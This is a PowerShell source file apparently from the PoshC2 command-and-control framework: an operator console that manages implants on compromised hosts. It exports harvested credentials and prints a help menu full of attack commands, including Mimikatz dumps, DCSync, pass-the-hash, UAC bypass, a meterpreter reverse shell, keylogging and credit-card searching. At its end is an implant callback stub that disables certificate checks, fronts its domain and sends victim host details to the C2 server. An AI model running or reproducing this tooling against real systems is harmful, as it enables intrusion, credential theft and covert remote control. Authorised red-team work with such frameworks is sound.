﻿<#
        .Synopsis
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .DESCRIPTION
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .EXAMPLE
        ImplantHandler -FolderPath C:\Temp\PoshC2-031120161055
#>
function Implant-Handler
{
    [CmdletBinding(DefaultParameterSetName = "FolderPath")]
    Param
    (
        [Parameter(ParameterSetName = "FolderPath", Mandatory = $false)]
        [string]
        $FolderPath,
        [string]
        $PoshPath
    )

    if (!$FolderPath) {
        $FolderPath = Read-Host -Prompt `n'Enter the root folder path of the Database/Project'
    }

    # initiate defaults
    $Database = "$FolderPath\PowershellC2.SQLite"
    $p = $env:PsModulePath
    $p += ";$PoshPath\"
    $global:randomuri = $null
    $global:cmdlineinput = 'PS >'
    $global:implants = $null
    $global:implantid = $null
    $global:command = $null
    $global:newdir = $FolderPath
    [Environment]::SetEnvironmentVariable("PSModulePath",$p)
    Import-Module -Name PSSQLite
    Import-Module "$PoshPath\Modules\ConvertTo-Shellcode.ps1"
    Import-Module "$PoshPath\C2-Payloads.ps1"

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $IPAddress = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $ipv4address = $c2serverresults.HostnameIP
    $serverport = $c2serverresults.ServerPort 
        
$head = '
<style>

body {
font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
}

table {
    table-layout: fixed;
    word-wrap: break-word;
    display: table;
    font-family: monospace;
    white-space: pre;
    margin: 1em 0;
}

th, td {
    text-align: left;
    padding: 8px;
}

tr:nth-child(even){background-color: #f2f2f2}

th {
    background-color: #4CAF50;
    color: white;
}
 
p { 
margin-left: 20px; 
font-size: 12px; 
}
 
</style>'

$header = '
<pre>
  __________            .__.     _________  ________  
  \_______  \____  _____|  |__   \_   ___ \ \_____  \ 
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ 
   |    |  (  <_> )___ \|   Y  \ \     \____/       \ 
   |____|   \____/____  >___|  /  \______  /\_______ \
                      \/     \/          \/         \/
  ============ @benpturner & @davehardy20 ============
  ====================================================
</pre>'


    function startup 
    {
        Clear-Host
        $global:implants = $null
        $global:command = $null
        $global:randomuri = $null
        $global:implantid = $null
        $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE Alive='Yes'" -As PSObject
        $global:implants = $dbresults.RandomURI

        # while no implant is selected
        while ($global:randomuri -eq $null)
        {
            Clear-Host
            Write-Host -Object ""
            Write-Host -Object ".___.              .__.                __          " -ForegroundColor Green
            Write-Host -Object "|   | _____ ______ |  | _____    _____/  |_  ______" -ForegroundColor Green
            Write-Host -Object "|   |/     \\____ \|  | \__  \  /    \   __\/  ___/" -ForegroundColor Green
            Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
            Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
            Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
            Write-Host "============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
            Write-Host "===================================================" `n -ForegroundColor Green

            foreach ($implant in $dbresults) 
            { 
                $randomurihost = $implant.RandomURI
                $implantid = $implant.ImplantID
                $im_arch = $implant.Arch
                $im_user = $implant.User
                $im_hostname = $implant.Hostname
                $im_lastseen = $implant.LastSeen
                $im_pid = $implant.PID
                $im_sleep = $implant.Sleep
                $im_domain = $implant.Domain
                if ($randomurihost) {
                    if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Yellow
                    }
                    elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Red
                    }
                    else {
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Green
                    } 
                }
            }

            if (($HelpOutput) -and ($HelpOutput -eq "PrintMainHelp")){
                print-mainhelp
                $HelpOutput = $Null
            } 

            if (($HelpOutput) -and ($HelpOutput -ne "PrintMainHelp")){
                Write-Host ""
                Write-Host $HelpOutput -ForegroundColor Green
                $HelpOutput = $Null
            }

            $global:implantid = Read-Host -Prompt `n'Select ImplantID or ALL or Comma Separated List (Enter to refresh):'
            Write-Host -Object ""
            if (!$global:implantid) 
            {
                startup
            }
            if ($global:implantid -eq "Help"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid -eq "?"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
            {
                [int]$Beacon = $global:implantid -replace "set-defaultbeacon ",""                                
                $HelpOutput = "DefaultBeacon updated to: $Beacon" 
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET DefaultSleep='$Beacon'"|Out-Null
                startup
            }
            elseif ($global:implantid -eq "automigrate-frompowershell")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "AM")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "L") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "list-autorun") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "nuke-autorun") 
            {
                Invoke-SqliteQuery -DataSource $Database -Query "Drop Table AutoRuns"
                
                $Query = 'CREATE TABLE AutoRuns (
                TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
                Task TEXT)'
                Invoke-SqliteQuery -Query $Query -DataSource $Database 
                startup
            }
            elseif ($global:implantid.ToLower().StartsWith("del-autorun")) 
            {
                $number = $global:implantid.Substring(12)
                $number = [int]$number
                if ($number  -match '^\d+$'){
                    Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM AutoRuns where TaskID='$number'"

                    $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                    foreach ($i in $autorunlist) {
                        $taskid = $i.TaskID
                        $taskname = $i.Task
                        $HelpOutput += "TaskID: $taskid | Task: $taskname"
                    }
                
                    startup    
                }
                else
                {  
                    $HelpOutput = "Error not an integer"
                    startup
                }
            }
            elseif ($global:implantid.ToLower().StartsWith("add-autorun")) 
            {
                $tasker = $global:implantid.Substring(12)
                write-host "$tasker" -ForegroundColor Cyan
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $tasker
                }
                $HelpOutput = "Added autorun $tasker"
                startup                
            } elseif ($global:implantid.ToLower().StartsWith("output-to-html"))
            {
                $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
                $CredsArray = @()
                foreach ($cred in $allcreds) {
                    $CredLog = New-object PSObject | Select  CredsID, Username, Password, Hash
                    $CredLog.CredsID = $cred.CredsID;
                    $Credlog.Username = $cred.Username;
                    $CredLog.Password = $cred.Password;
                    $CredLog.Hash = $cred.Hash;
                    $CredsArray += $CredLog
                }
                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                    $ImplantLog.ImplantID = $implantres.ImplantID;
                    $ImplantLog.RandomURI = $implantres.RandomURI;
                    $ImplantLog.User = $implantres.User;
                    $ImplantLog.Hostname = $implantres.Hostname;
                    $ImplantLog.IPAddress = $implantres.IPAddress;
                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
                    $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
                    $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
                    $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"

               $HelpOutput = "Created three reports in $FolderPath\reports\*"
                
            } elseif ($global:implantid -eq "P")
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("pwnself"))
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("show-serverinfo"))
            {
                $HelpOutput  = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("createproxypayload")) 
            {
                $HelpOutput = IEX $global:implantid
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("creds")) 
            {
                $HelpOutput = IEX $global:implantid
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("listmodules")) 
            {
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        $HelpOutput += $mod + "`n"
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  $HelpOutput += $mod + "`n"
                }
                
                $HelpOutput
            }  
            elseif ($global:implantid.Contains(","))
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break 
            } elseif ($global:implantid -eq "ALL") 
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break
            } else 
            {
                $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$global:implantid'" -as SingleValue
                $global:cmdlineinput = "PS $global:implantid>"   
            }
        }
    }

    $tick = "'"
    $speechmarks = '"'

     function print-mainhelp {
        write-host `n "Main Menu: " -ForegroundColor Green
        write-host "================================" -ForegroundColor Red
        write-host " Use Implant by <id>, e.g. 1"-ForegroundColor Green
        write-host " Use Multiple Implants by <id>,<id>,<id>, e.g. 1,2,5"-ForegroundColor Green
        write-host " Use ALL Implants by ALL" -ForegroundColor Green
        write-host `n "Auto-Runs: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Add-autorun <task>"-ForegroundColor Green
        write-host " List-autorun (Alias: L)"-ForegroundColor Green
        write-host " Del-autorun <taskID>"-ForegroundColor Green
        write-host " Nuke-autorun"-ForegroundColor Green
        write-host " Automigrate-FromPowershell (Alias: AM)"-ForegroundColor Green
        write-host `n "Server Commands: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green
        write-host " Set-DefaultBeacon 60"-ForegroundColor Green
        write-host " ListModules " -ForegroundColor Green
        write-host " PwnSelf (Alias: P)" -ForegroundColor Green
        write-host " Creds -Action <dump/add/del/search> -Username <username> -password/-hash"-ForegroundColor Green 
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
    }

    function print-help {
        write-host `n "Implant Features: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
        write-host " Turtle 60s / Turtle 30m / Turtle 8h "-ForegroundColor Green 
        write-host " Kill-Implant"-ForegroundColor Green 
        write-host " Hide-Implant"-ForegroundColor Green 
        write-host " Unhide-Implant"-ForegroundColor Green 
        write-host " Invoke-Enum"-ForegroundColor Green 
        write-host " Get-Proxy"-ForegroundColor Green 
        write-host " Get-ComputerInfo"-ForegroundColor Green 
        write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
        write-host " Get-System" -ForegroundColor Green
        write-host " Get-System-WithProxy" -ForegroundColor Green 
        write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
        write-host " Get-Pid" -ForegroundColor Green 
        write-host " Get-Webpage http://intranet" -ForegroundColor Green 
        write-host " ListModules " -ForegroundColor Green
        write-host " ModulesLoaded " -ForegroundColor Green 
        write-host " LoadModule <modulename>" -ForegroundColor Green 
        write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
        write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
        write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
        write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
        write-host " Get-MSHotfixes" -ForegroundColor Green 
        write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
        write-host " EnableRDP" -ForegroundColor Green
        write-host " DisableRDP" -ForegroundColor Green
        write-host " Netsh.exe advfirewall firewall add rule name=`"EnableRDP`" dir=in action=allow protocol=TCP localport=any enable=yes" -ForegroundColor Green
        write-host " Get-WLANPass" -ForegroundColor Green
        write-host " Get-WmiObject -Class Win32_Product" -ForegroundColor Green
        write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
        write-host `n "Privilege Escalation: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Invoke-AllChecks" -ForegroundColor Green
        write-host " Invoke-UACBypass" -ForegroundColor Green
        write-host " Invoke-UACBypassProxy" -ForegroundColor Green
        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"}' -ForegroundColor Green
        write-host " Invoke-MS16-032" -ForegroundColor Green 
        write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
        write-host " Get-GPPPassword" -ForegroundColor Green 
        write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
        write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
        write-host `n "File Management: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
        write-host " Download-Files -Directory 'C:\Temp Dir\'" -ForegroundColor Green
        write-host " Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'" -ForegroundColor Green  
        write-host " Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe' " -ForegroundColor Green 
        write-host `n "Persistence: " -ForegroundColor Green
        write-host "================" -ForegroundColor Red
        write-host " Install-Persistence 1,2,3 " -ForegroundColor Green 
        write-host " Remove-Persistence 1,2,3" -ForegroundColor Green 
        write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-ExternalIP" -ForegroundColor Green
        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green 
        write-host " Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password" -ForegroundColor Green
        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Net View | Net Users | Net localgroup administrators | Net Accounts /dom " -ForegroundColor Green
        write-host " Whoami /groups | Whoami /priv " -ForegroundColor Green  
        write-host `n "Active Directory Enumeration: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Invoke-ACLScanner" -ForegroundColor Green
        write-host " Get-ObjectACL -ResolveGUIDs -SamAccountName john" -ForegroundColor Green
        write-host " Add-ObjectACL -TargetSamAccountName arobbins -PrincipalSamAccountName harmj0y -Rights ResetPassword" -ForegroundColor Green
        write-host " Get-Netuser -admincount | select samaccountname" -ForegroundColor Green
        write-host " Get-Netgroup -admincount | select samaccountname" -ForegroundColor Green
        write-host " Get-NetGroupMember "Domain Admins" -recurse|select membername" -ForegroundColor Green
        write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
        write-host ' Get-NetGroup | select samaccountname' -ForegroundColor Green
        write-host ' Get-NetGroup "*BEN*" | select samaccountname ' -ForegroundColor Green
        write-host ' Get-NetGroupMember "Domain Admins" -recurse|select membername' -ForegroundColor Green
        write-host `n "Domain Trusts: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-NetDomain | Get-NetDomainController | Get-NetForestDomain" -ForegroundColor Green 
        write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
        write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
        write-host `n "Other Network Tasks: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Invoke-BloodHound -CollectionMethod 'Stealth' -CSVFolder C:\temp\" -ForegroundColor Green
        write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
        write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Invoke-Kerberoast -AdminCount -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
        write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
        write-host " Get-NetFileServer -Domain testdomain.com" -ForegroundColor Green
        write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
        write-host " Brute-AD" -ForegroundColor Green 
        write-host " Brute-LocAdmin -Username administrator" -ForegroundColor Green 
        Write-Host " Get-PassPol" -ForegroundColor Green
        Write-Host " Get-PassNotExp" -ForegroundColor Green
        Write-Host " Get-LocAdm" -ForegroundColor Green
        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        Write-Host " Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
        Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
        Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -Args <optional> -LogonType 0x2" -ForegroundColor Green        
        write-host " Invoke-DCOMPayload -Target <ip>" -ForegroundColor Green
        write-host " Invoke-DCOMProxyPayload -Target <ip>" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
        #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
        write-host "=========================================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::logonpasswords$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::cache$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)ts::multirdp$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)privilege::debug$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::capi$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::certificates /export$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
        write-host ' Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"' -ForegroundColor Green
        write-host `n "Credentials / Domain Controller Hashes: " -ForegroundColor Green
        write-host "============================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
        write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
        write-host `n "Useful Modules: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Get-Screenshot" -ForegroundColor Green
        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
        write-host " Get-RecentFiles" -ForegroundColor Green
        write-host " Cred-Popper" -ForegroundColor Green 
        write-host " Hashdump" -ForegroundColor Green 
        write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
        write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
        write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
        write-host " Migrate-x64" -ForegroundColor Green
        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-x64 -NewProcess C:\Windows\System32\netsh.exe" -ForegroundColor Green
        write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
        write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
        write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
        write-host `n "Implant Handler: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Back" -ForegroundColor Green 
        write-host " Exit" `n -ForegroundColor Green 
    }

    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
